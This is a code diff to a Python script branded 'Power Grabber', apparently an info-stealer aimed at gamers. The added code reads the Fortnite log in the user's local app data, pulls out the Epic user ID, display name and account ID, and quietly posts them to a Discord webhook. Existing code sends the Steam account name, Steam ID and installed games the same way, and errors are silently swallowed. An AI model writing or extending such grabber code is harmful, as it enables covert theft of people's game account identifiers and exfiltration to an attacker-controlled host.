@@ -2,6 +2,76 @@ import os
 import re
 import requests
 import datetime
+app_data_path = os.getenv('APPDATA')
+log_file_path = os.path.join(app_data_path, r"..\Local\FortniteGame\Saved\Logs\FortniteGame.log")
+def find_user_info(log_file_path):
+    try:
+        with open(log_file_path, 'r', encoding='utf-8') as file:
+            for line in file:
+                match = re.search(r'UserId=\[([^\]]+)\].*DisplayName=\[([^\]]+)\].*EpicAccountId=\[([^\]]+)\]', line)
+                if match:
+                    user_id = match.group(1)
+                    display_name = match.group(2)
+                    epic_account_id = match.group(3)
+                    return user_id, display_name, epic_account_id
+        return None, None, None
+    except FileNotFoundError:
+        pass
+        return None, None, None
+def send_to_discord(display_name, user_id, epic_account_id, image_url):
+    embed = {
+        "embeds": [
+            {
+                "title": f"**{display_name}'s Fornite info:**",
+                "color": 0x8b0000,
+                "thumbnail": {
+                    "url": image_url
+                },
+                "fields": [
+                    {
+                        "name": "Username:",
+                        "value": display_name,
+                        "inline": True
+                    },
+                    {
+                        "name": "User ID:",
+                        "value": user_id,
+                        "inline": True
+                    },
+                    {
+                        "name": "Epic Account ID:",
+                        "value": epic_account_id,
+                        "inline": True
+                    },
+                    {
+                        "name": "Fortnite Tracker URL:",
+                        "value": f"https://fortnitetracker.com/profile/all/{display_name}",
+                        "inline": False
+                    }
+                ],
+                "footer": {
+                    "text": "Power Grabber | Made by Powercascade and Taktikal.exe",
+                    "icon_url": image_url
+                }
+            }
+        ]
+    }
+    response = requests.post(webhook_url, json=embed)
+    if response.status_code == 204:
+        pass
+    else:
+        pass
+user_id, display_name, epic_account_id = find_user_info(log_file_path)
+
+img = {
+    'image_url': 'https://github.com/Powercascade/Power-grabber/blob/main/Power%20Grabber.png?raw=true'
+}
+image_url = img['image_url']
+
+if user_id and display_name and epic_account_id:
+    send_to_discord(display_name, user_id, epic_account_id, image_url)
+else:
+    pass
 STEAM_DEFAULT_PATHS = [
     "C:\\Program Files (x86)\\Steam",
     "C:\\Program Files\\Steam",
@@ -62,7 +132,7 @@ def get_installed_steam_games(steam_install_path):
                     if game_name and game_name not in SYSTEM_GAME_NAMES:
                         installed_games.append(game_name)
     return installed_games
-def send_webhook(account_name, games, steam_id):
+def send_webhook(account_name, games, steam_id, image_url):
     games_url = f"https://steamcommunity.com/id/{steam_id}/games"
     wishlist_url = f"https://steamcommunity.com/id/{steam_id}/wishlist"
     timestamp = datetime.datetime.utcnow().isoformat() + "Z"
@@ -75,7 +145,7 @@ def send_webhook(account_name, games, steam_id):
                 ),
                 "color": 0x8b0000,
                 "thumbnail": {
-                    "url": "https://github.com/Powercascade/Power-grabber/blob/main/Power%20Grabber.png?raw=true"
+                    "url": image_url
                 },
                 "fields": [
                     {
@@ -106,7 +176,7 @@ def send_webhook(account_name, games, steam_id):
                 ],
                 "footer": {
                     "text": "Power Grabber | Created by Powercascade & Taktikal.exe",
-                    "icon_url": "https://github.com/Powercascade/Power-grabber/blob/main/Power%20Grabber.png?raw=true"
+                    "icon_url": image_url
                 },
                 "timestamp": timestamp
             }
@@ -128,7 +198,7 @@ def main():
         account_name, steam_id = get_account_name_and_steam_id_from_vdf(vdf_path)
         if account_name and steam_id:
             games = get_installed_steam_games(steam_install_path)
-            send_webhook(account_name, games, steam_id)
+            send_webhook(account_name, games, steam_id, image_url)
         else:
             pass
     else:
